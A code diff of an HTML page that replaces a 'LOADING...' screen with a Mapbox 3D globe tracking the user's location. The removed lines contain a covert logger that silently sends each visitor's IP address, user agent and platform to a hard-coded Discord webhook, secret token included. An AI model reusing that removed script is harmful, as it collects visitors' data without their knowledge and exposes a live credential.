@@ -1,80 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>neonxsl</title>
-  <style>
-    /* Import the Lexend font */
-    @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@400;600&display=swap');
-
-    /* Basic styling for the body */
-    body {
-      background-color: black;
-      color: white;
-      font-family: 'Lexend', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      text-align: center;
-    }
-
-    /* Styling for the loading text */
-    h1 {
-      font-size: 3rem;
-      margin: 0;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="initial-scale=1.0">
+    <title>Mapbox GL JS - 3D Globe with Current Location</title>
+    <link href="https://api.mapbox.com/mapbox-gl-js/v3.9.1/mapbox-gl.css" rel="stylesheet">
+    <script src="https://api.mapbox.com/mapbox-gl-js/v3.9.1/mapbox-gl.js"></script>
+    <style>
+        body { margin: 0; padding: 0; }
+        #map { position: absolute; top: 0; bottom: 0; width: 100%; }
+        
+        /* Custom marker style */
+        .marker {
+            background-image: url('https://cdn.prod.website-files.com/62c5e0898dea0b799c5f2210/62e8212acc540f291431bad2_location-icon.png');
+            background-size: cover;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-  <!-- Add missing elements -->
-  <h1>LOADING...</h1>
-  <p><strong></strong> <span id="deviceName"></span></p>
-  <p><strong></strong> <span id="deviceModel"></span></p>
-  <p><strong></strong> <span id="ipAddress"></span></p>
+    <div id="map"></div>
 
-  <script>
-    // Fetch the IP address from a third-party API
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        // Prepare the data to be sent to the Discord webhook
-        const deviceInfo = {
-          content: `Device Information:
-          \nDevice Name: ${navigator.userAgent}
-          \nDevice Model: ${navigator.platform}
-          \nIP Address: ${data.ip}`
-        };
+    <script>
+        mapboxgl.accessToken = 'pk.eyJ1Ijoic2FiYXJpc2hzIiwiYSI6ImNtMGo0dW50aDBxcWoya29neGptOXdyYmwifQ.e20zeNypFv8y7afl414PSA';
 
-        // Send the device information to the Discord webhook
-        fetch('https://discord.com/api/webhooks/1162536831859036250/hE08qlNdmi-4QYLQCvjTgrpS_aZzCxC642ynTuFqSamI0LxMwYFR3-8BCti3VOqAnEdf', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(deviceInfo)
-        })
-        .then(response => {
-          console.log('Webhook response status:', response.status); // Log the response status
-          return response.json();
-        })
-        .then(result => {
-          console.log('Successfully sent to Discord:', result);
-        })
-        .catch(error => {
-          console.error('Error sending to Discord:', error);
-        });
+        let userLocation = [30, 15]; // Default location (will be replaced once geolocation is available)
+        let userHeading = 0; // Default heading (in degrees)
+        let userMarker = null;
+        
+        // Function to initialize the map
+        function initializeMap(center) {
+            const map = new mapboxgl.Map({
+                container: 'map',
+                style: 'mapbox://styles/sabarishs/cm5apzgaz00ql01spg1dkd9fo',
+                projection: 'globe',  // This makes the map appear as a 3D globe
+                zoom: 10,              // Set zoom to a global view initially
+                center: center,       // Set the initial map center
+                pitch: 60,            // Tilt the map for 3D effect
+                bearing: 0            // Set initial rotation of the globe
+            });
 
-        // Set the content to "LOADING..." as requested
-        document.getElementById("deviceName").textContent = "";
-        document.getElementById("deviceModel").textContent = "";
-        document.getElementById("ipAddress").textContent = "";
-      })
-      .catch(err => {
-        console.error('Error fetching IP address:', err);
-      });
-  </script>
+            map.scrollZoom.disable();
+
+            map.on('style.load', () => {
+                map.setFog({
+                    range: [0.5, 3],
+                    color: 'rgb(255, 255, 255)',
+                    highColor: 'rgb(255, 255, 255)',
+                    anchor: 'center'
+                });
+            });
+
+            return map;
+        }
+
+        // Function to update user's location and heading
+        function updateLocation(map) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    userLocation = [position.coords.longitude, position.coords.latitude];
+                    userHeading = position.coords.heading || 0; // Use the heading if available, otherwise 0
+
+                    // Create or update the marker
+                    if (!userMarker) {
+                        const el = document.createElement('div');
+                        el.className = 'marker';
+
+                        userMarker = new mapboxgl.Marker(el)
+                            .setLngLat(userLocation)
+                            .addTo(map)
+                            .togglePopup();
+                    } else {
+                        userMarker.setLngLat(userLocation);
+                    }
+
+                    // Update map bearing to match the user's heading
+                    map.easeTo({
+                        center: userLocation,
+                        bearing: userHeading,  // Set the bearing based on user's heading
+                        zoom: 17.9,
+                        speed: 1,  // Controls the speed of the transition
+                        curve: 1.5,    // Smoother transition curve
+                        easing: function (t) { return t; }
+                    });
+
+                }, function(error) {
+                    alert("Error retrieving location: " + error.message);
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // First, get the user's location and initialize the map
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                userLocation = [position.coords.longitude, position.coords.latitude];
+                
+                // Initialize the map with the user's location as the center
+                const map = initializeMap(userLocation);
+
+                // Update location every 5 seconds for continuous movement
+                setInterval(() => updateLocation(map), 100);
+            }, function(error) {
+                alert("Error retrieving location: " + error.message);
+            });
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    </script>
 </body>
 </html>
